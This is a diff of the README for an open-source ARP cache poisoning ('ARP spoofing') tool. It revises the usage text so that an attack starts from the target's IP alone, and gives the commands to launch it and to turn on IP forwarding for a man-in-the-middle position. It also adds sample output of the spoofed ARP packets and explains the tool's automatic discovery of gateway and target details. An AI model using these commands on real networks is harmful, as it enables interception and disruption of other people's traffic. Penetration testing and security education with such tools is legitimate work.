@@ -24,25 +24,32 @@ user@host:~/DIR$ git clone https://github.com/EONRaider/Arp-Spoofer.git
 
 ## Usage
 ```
-arpspoof.py [-h] (--attackermac MAC | --disassociate) --gatemac MAC --targetmac MAC 
-            --gateip IP --targetip IP interface
+arpspoof.py [-h] [-i INTERFACE] [--attackermac MAC] [--gatemac MAC]
+                   [--targetmac MAC] [--gateip IP] [--interval TIME]
+                   [--disassociate]
+                   IP
 
 Execute ARP Cache Poisoning attacks (a.k.a "ARP Spoofing") on local networks.
 
 positional arguments:
-  interface          Interface on the attacker machine to send packets from.
+  TARGET_IP                    IP address currently assigned to the target.
 
 optional arguments:
-  -h, --help         show this help message and exit
-  --gatemac MAC      MAC address of the NIC associated to the gateway.
-  --targetmac MAC    MAC address of the NIC associated to the target.
-  --gateip IP        IP address currently assigned to the gateway.
-  --targetip IP      IP address currently assigned to the target.
-  --interval TIME    Time in between each transmission of spoofed ARP packets 
-                     (defaults to 0.5 seconds).
-  --disassociate     Execute a disassociation attack in which a randomized MAC 
-                     address is set for the attacker machine, effectively making 
-                     the target host send packets to a non-existent gateway.
+  -h, --help            show this help message and exit
+  -i INTERFACE, --interface INTERFACE
+                        Interface on the attacker machine to send packets
+                        from.
+  --attackermac MAC     MAC address of the NIC from which the attacker machine
+                        will send the spoofed ARP packets.
+  --gatemac MAC         MAC address of the NIC associated to the gateway.
+  --targetmac MAC       MAC address of the NIC associated to the target.
+  --gateip IP           IP address currently assigned to the gateway.
+  --interval TIME       Time in between each transmission of spoofed ARP
+                        packets (defaults to 0.5 seconds).
+  --disassociate        Execute a disassociation attack in which a randomized
+                        MAC address is set for the attacker machine,
+                        effectively making the target host send packets to a
+                        non-existent gateway.
 ```
 
 
@@ -52,28 +59,70 @@ optional arguments:
 forwarding of IPv4 packets through the attacker machine. This is a temporary solution 
 meant to be reset upon the next reboot (for a permanent solution check [this guide](https://linuxhint.com/enable_ip_forwarding_ipv4_debian_linux/)):
 
-  `user@host:~$ sudo sysctl -w net.ipv4.ip_forward=1`
+```sh
+user@host:~$ sudo sysctl -w net.ipv4.ip_forward=1
+```
 
 - Example command in which we initiate an attack against a given target machine 
 and gateway (the `eth0` interface is the one the attacker uses to send spoofed 
 packets in this example):
-  ```
-  user@host:~$ sudo python3 arpspoof.py eth0 \
-  --gateip 10.0.1.1 --gatemac 52:54:00:45:6a:69 \
-  --targetip 10.0.1.6 --targetmac 08:00:27:83:dc:02
+```sh
+user@host:~$ sudo python3 arpspoof.py 10.0.1.6
   
-  [+] ARP Spoofing attack initiated. Press Ctrl-C to abort.
-  ```
+[>>>] ARP Spoofing configuration:
+    [+] Interface    .....................eth0
+    [+] Attacker MAC ........08:92:27:dc:3a:71
+    [+] Gateway IP   .................10.0.1.1
+    [+] Gateway MAC  ........52:93:d0:92:c5:06
+    [+] Target IP    .................10.0.1.6
+    [+] Target MAC   ........91:8b:28:93:af:07
+
+[!] ARP packets ready. Execute the attack with these settings? (Y/N) y
+
+[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.
+```
 - Traffic displayed by [Network Packet Sniffer](https://github.com/EONRaider/Packet-Sniffer)
 as the attack initiated above takes place:
-  ```
-  [>] Packet #1 at 15:15:03:
-      [+] MAC ......08:00:27:1f:6a:67 -> 52:54:00:45:6a:69
-      [+] ARP ...............10.0.1.6 -> Is at 08:00:27:1f:6a:67
-  [>] Packet #2 at 15:15:03:
-      [+] MAC ......08:00:27:1f:6a:67 -> 08:00:27:83:dc:02
-      [+] ARP ...............10.0.1.1 -> Is at 08:00:27:1f:6a:67
-  ```
+```
+[>] Packet #1 at 14:10:12:
+    [+] MAC ......08:92:27:dc:3a:71 -> ff:ff:ff:ff:ff:ff
+    [+] ARP Who has      10.0.1.6 ? -> Tell 10.0.1.5
+[>] Packet #2 at 14:10:12:
+    [+] MAC ......91:8b:28:93:af:07 -> 08:92:27:dc:3a:71
+    [+] ARP ...............10.0.1.6 -> Is at 91:8b:28:93:af:07
+[>] Packet #3 at 14:10:12:
+    [+] MAC ......08:92:27:dc:3a:71 -> 91:8b:28:93:af:07
+    [+] IPv4 ..............10.0.1.5 -> 10.0.1.6        | PROTO: UDP TTL: 64
+    [+] UDP ..................52949 -> 54663
+[>] Packet #4 at 14:10:12:
+    [+] MAC ......91:8b:28:93:af:07 -> 08:92:27:dc:3a:71
+    [+] IPv4 ..............10.0.1.6 -> 10.0.1.5        | PROTO: ICMP TTL: 64
+    [+] ICMP ..............10.0.1.6 -> 10.0.1.5        | Type: OTHER
+[>] Packet #5 at 14:10:18:
+    [+] MAC ......08:92:27:dc:3a:71 -> 52:54:00:12:35:00
+    [+] ARP ...............10.0.1.6 -> Is at 08:92:27:dc:3a:71
+[>] Packet #6 at 14:10:18:
+    [+] MAC ......08:92:27:dc:3a:71 -> 91:8b:28:93:af:07
+    [+] ARP ...............10.0.1.1 -> Is at 08:92:27:dc:3a:71
+```
+
+### How it works
+
+From the docstring of the `ARPSetupProxy` class in the 
+[packets.py](https://github.com/EONRaider/Arp-Spoofer/blob/master/packets.py)
+file:
+> Performs a best-effort attempt to query the system and network for
+information necessary to build the ARP attack packets. **It allows the
+user to initiate an attack by simply supplying the target's IP
+address**. All other required settings are looked up from the
+attacker system's ARP and routing tables and by probing ephemeral
+ports on the target host.
+
+That is the reason why a simple command such as 
+`sudo python3 arpspoof.py 10.0.1.6` from the instructions above is able to 
+initiate a gathering of all required information to initiate the attack,
+releasing the Penetration Tester from going through all the usual commands
+necessary to obtain them.
 
 ## Legal Disclaimer
 The use of code contained in this repository, either in part or in its totality, 
